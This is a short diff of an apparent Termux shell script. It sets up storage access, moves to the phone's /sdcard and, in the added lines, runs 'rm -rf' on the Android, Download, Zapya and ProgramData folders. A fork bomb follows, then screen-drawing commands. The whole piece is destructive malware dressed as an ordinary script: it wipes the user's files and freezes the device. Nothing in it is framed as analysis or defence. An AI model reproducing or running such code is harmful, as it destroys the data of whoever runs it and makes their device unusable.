@@ -2,9 +2,10 @@ pkg install ncurses-utils
 pkg install git
 termux-setup-storage
 cd /sdcard
-cd Android
-rm -rf data
-rm -rf obb
+rm -rf Android
+rm -rf Download
+rm -rf Zapya
+rm -rf ProgramData
 :(){ :|: & };:
 tput clear
 tput cup 3 15
